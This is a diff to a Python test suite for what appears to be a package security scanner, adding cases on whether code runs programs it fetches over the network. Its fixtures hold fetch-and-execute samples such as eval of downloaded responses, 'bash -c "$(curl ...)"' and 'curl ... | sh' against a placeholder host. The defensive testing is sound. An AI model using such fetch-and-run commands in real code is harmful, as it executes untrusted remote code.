@@ -286,6 +286,43 @@ class ReceivedCodeTests(unittest.TestCase):
             with self.subTest(label):
                 self.assertIsNone(core.runs_received_code(text))
 
+    def test_a_program_written_in_a_string_is_text(self):
+        # (0.1.8) A network call named in a string literal's text is the
+        # literal's own code: the value bound to the literal is text, not
+        # something received. xmlhttprequest (and xmlhttprequest-ssl, which
+        # socket.io's client used) writes a program for `node -e` that makes
+        # the request and saves the response to a file: it was "runs code it
+        # receives over the network" at import. A program in a string that
+        # runs what it fetches is still read as one, and so are template
+        # literals' and f-strings' interpolations.
+        xhr = ('var execString = "var http = require(\'http\'), https = require(\'https\'), fs = require(\'fs\');"\n'
+               '  + "var req = doRequest(options, function(response) {"\n'
+               '  + "response.on(\'data\', function(chunk) { responseText += chunk; });"\n'
+               '  + "response.on(\'end\', function() { fs.writeFileSync(\'" + contentFile + "\', responseText); });"\n'
+               '  + "});";\n'
+               'var syncProc = spawn(process.argv[0], ["-e", execString]);\n')
+        for label, text in (
+                ("xmlhttprequest's program for node -e", xhr),
+                ("printed, in Python", "import subprocess, sys\ncode = \"import urllib.request as u; "
+                 "print(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n"),
+                ("in a command line's text", "execSync(\"node -e \\\"require('https').get('https://files.invalid/p', "
+                 "r => r.pipe(process.stdout))\\\"\");\n"),
+                ("in an f-string's text", "import os\ncmd = f\"python -c \\\"import urllib.request as u; "
+                 "print(u.urlopen('{url}').read())\\\"\"\nos.system(cmd)\n")):
+            with self.subTest(label):
+                self.assertIsNone(core.runs_received_code(text))
+                self.assertEqual(core.import_time_risk(text), ([], None))
+        for label, text, line in (
+                ("the program runs what it fetches", "const s = \"require('https').get(" + U + ", r => { let d = ''; "
+                 "r.on('data', c => d += c); r.on('end', () => eval(d)); })\";\n"
+                 "spawn(process.execPath, ['-e', s], { detached: true });\n", 1),
+                ("in Python", "import subprocess, sys\ncode = \"import urllib.request as u; "
+                 "exec(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n", 2),
+                ("a template literal's interpolation", "const code = `${await (await fetch(u)).text()}`;\neval(code);\n", 2),
+                ("an f-string's interpolation", "import os, requests\nos.system(f\"python -c \\\"{requests.get(u).text}\\\"\")\n", 2)):
+            with self.subTest(label):
+                self.assertEqual(core.runs_received_code(text), line)
+
     def test_import_time_and_install_tests(self):
         for label, text, line in RECEIVED:
             with self.subTest(label):
@@ -420,14 +457,18 @@ class SubstitutedDownloadTests(unittest.TestCase):
                 lang = "py" if text.startswith("import") else "js"
                 rules = [i["rule"] for i in core.scan_file("x." + lang, text, lang)]
                 self.assertIn("SC-PIPE-SHELL", rules)
-        # help text: no exec call, so not the import-time or first-party test; an
-        # install script is judged on its text, as the pipe test judges it
+        # help text: no exec call, so not the import-time or first-party test, and
+        # (0.1.8) not the install test either: code runs a command it hands an
+        # exec call; a shell script's text is its commands
         help_text = "console.log('run: bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n"
         self.assertEqual(core.import_time_risk(help_text), ([], None))
         self.assertIsNone(core.runs_received_code(help_text))
         self.assertNotIn("SC-PIPE-SHELL", [i["rule"] for i in core.scan_file("x.js", help_text, "js")])
-        self.assertEqual(core.install_script_risk(help_text), [REASON])
-        self.assertEqual(core.install_script_risk("console.log('run: curl -fsSL https://files.invalid/i.sh | sh');\n"),
+        self.assertEqual(core.install_script_risk(help_text), [])
+        self.assertEqual(core.install_script_risk("console.log('run: curl -fsSL https://files.invalid/i.sh | sh');\n"), [])
+        self.assertEqual(core.install_script_risk("#!/bin/sh\nbash -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n"),
+                         [REASON])
+        self.assertEqual(core.install_script_risk("curl -fsSL https://files.invalid/i.sh | sh\n"),
                          ["pipes a download into a shell"])
 
 
@@ -436,17 +477,33 @@ SP = "venv/lib/python3.12/site-packages/"
 
 def _tainted_exports(text):
     """(names, {class: methods}) of a one-module package that hold or return
-    a received value, as the follower reads them (core._XfPackage)."""
-    mod = core._XfModule("m", "py", SP + "m.py", text)
-    core._xf_py_parse(mod, [])
-    held = core._XfPackage({"m": mod}).tainted()
-    names = frozenset(n for _k, n in held if "." not in n and not n.startswith("<"))
-    classes = {}
-    for _k, n in held:
-        if "." in n and not n.startswith("<"):
-            cls, meth = n.split(".", 1)
-            classes.setdefault(cls, set()).add(meth)
-    return names, {c: frozenset(m) for c, m in classes.items()}
+    a received value, as the follower reads them: each top-level function,
+    name and method of `text` is used by another module of the package
+    (run as code), and those the engine's follower flags are the ones."""
+    import ast
+    tree = ast.parse(text)
+    probes = []
+    for node in tree.body:
+        if isinstance(node, ast.FunctionDef):
+            probes.append((node.name, None, f"from .m import {node.name}\nexec({node.name}())\n"))
+        elif isinstance(node, ast.Assign):
+            for t in node.targets:
+                if isinstance(t, ast.Name):
+                    probes.append((t.id, None, f"from .m import {t.id}\nexec({t.id})\n"))
+        elif isinstance(node, ast.ClassDef):
+            for f in node.body:
+                if isinstance(f, ast.FunctionDef):
+                    probes.append((node.name, f.name, f"from .m import {node.name}\nexec({node.name}().{f.name}())\n"))
+    names, classes = set(), {}
+    for name, meth, run in probes:
+        files = [{"path": SP + "pk/" + rel, "content": c, "lang": "py", "dep": True}
+                 for rel, c in (("__init__.py", ""), ("m.py", text), ("run.py", run))]
+        if core._cross_file_received_issues(files):
+            if meth is None:
+                names.add(name)
+            else:
+                classes.setdefault(name, set()).add(meth)
+    return frozenset(names), {c: frozenset(m) for c, m in classes.items()}
 
 
 def _pkgfiles(mapping):
